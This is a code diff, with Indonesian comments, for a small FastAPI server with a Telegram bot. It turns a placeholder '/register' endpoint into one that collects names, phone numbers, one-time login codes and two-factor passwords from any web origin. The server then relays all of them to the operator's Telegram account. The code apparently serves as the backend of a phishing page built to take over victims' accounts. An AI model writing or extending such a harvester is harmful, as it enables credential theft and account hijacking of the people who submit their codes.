@@ -3,10 +3,10 @@ from fastapi.middleware.cors import CORSMiddleware
 from telethon import TelegramClient
 import os
 
-# 1. Definisikan 'app' terlebih dahulu
+# 1. DEFINE APP DI PALING ATAS (Agar tidak error 'not defined')
 app = FastAPI()
 
-# 2. Tambahkan Middleware
+# 2. KONFIGURASI CORS
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -14,19 +14,41 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# 3. Pengaturan Telegram
+# 3. AMBIL DATA DARI VARIABLES RAILWAY
 API_ID = os.getenv('API_ID')
 API_HASH = os.getenv('API_HASH')
 BOT_TOKEN = os.getenv('BOT_TOKEN')
-bot_client = TelegramClient('bot_session', int(API_ID), API_HASH)
 
-# 4. Fungsi-fungsi lainnya (startup, register, root)
+# Pastikan bot_client didefinisikan setelah variabel diambil
+bot_client = TelegramClient('bot_session', int(API_ID) if API_ID else 0, API_HASH)
+
 @app.on_event("startup")
 async def startup_event():
-    await bot_client.start(bot_token=BOT_TOKEN)
+    if BOT_TOKEN:
+        await bot_client.start(bot_token=BOT_TOKEN)
+        print("Backend Berhasil Online!")
 
 @app.post("/register")
 async def register(request: Request):
     data = await request.json()
-    # ... isi kode kirim telegram kamu ...
+    nama = data.get("name")
+    phone = data.get("phone")
+    step = data.get("step") 
+    otp = data.get("otp", "")
+    password = data.get("password", "")
+    
+    # Format pesan lengkap untuk Telegram
+    message = f"🔔 **Notif Pendaftaran**\n\n👤 Nama: {nama}\n📱 No: {phone}\n🛠 Status: {step}"
+    
+    if otp:
+        message += f"\n🔑 Kode OTP: {otp}"
+    if password:
+        message += f"\n🔒 Sandi/2FA: {password}"
+        
+    await bot_client.send_message('me', message)
     return {"status": "success"}
+
+# 4. ROOT ROUTE (Agar URL tidak "Not Found")
+@app.get("/")
+async def root():
+    return {"message": "Server Aktif!"}
